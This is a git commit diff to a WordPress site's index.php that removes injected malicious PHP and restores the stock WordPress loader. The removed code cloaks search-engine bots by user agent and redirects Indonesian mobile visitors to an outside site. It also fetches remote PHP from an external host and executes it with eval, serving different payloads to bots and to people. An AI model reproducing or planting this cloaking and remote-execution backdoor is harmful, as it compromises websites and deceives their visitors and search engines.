467df9074e32b7e9a684d1113fb36c3b013ca52c
dangerman88 <d4ngerman88@outlook.com>
2025-08-07 13:06:44 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,45 +1,17 @@
 <?php
-function is_bot() {
-$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? '';
-$bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool", "adsense", "slurp");
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-return false;
-}
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-function is_mobile() {
-$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? '';
-$mobile_agents = array("Mobile", "Android", "Silk/", "Kindle", "BlackBerry", "Opera Mini", "Opera Mobi", "iPhone", "iPod", "iPad");
-foreach ($mobile_agents as $device) {
-if (stripos($user_agent, $device) !== false) {
-return true;
-}
-}
-return false;
-}
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-function get_country() {
-return $_SERVER["HTTP_CF_IPCOUNTRY"] ?? '';
-}
-
-if (!is_bot() && is_mobile() && strtolower(get_country()) === "id") {
-header("Location: https://douberman.dev/amp/amp-juneenterprises.html");
-die;
-}
-
-$url = is_bot()
-? "https://dangerman.locker/landing/juneenterprises/index.txt"
-: "https://dangerman.locker/landing/juneenterprises/realscript.txt";
-
-$content = @file_get_contents($url);
-
-if ($content !== false && trim($content) !== '') {
-eval("?>" . $content);
-} else {
-header("HTTP/1.1 404 Not Found");
-die("404 Not Found");
-}
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
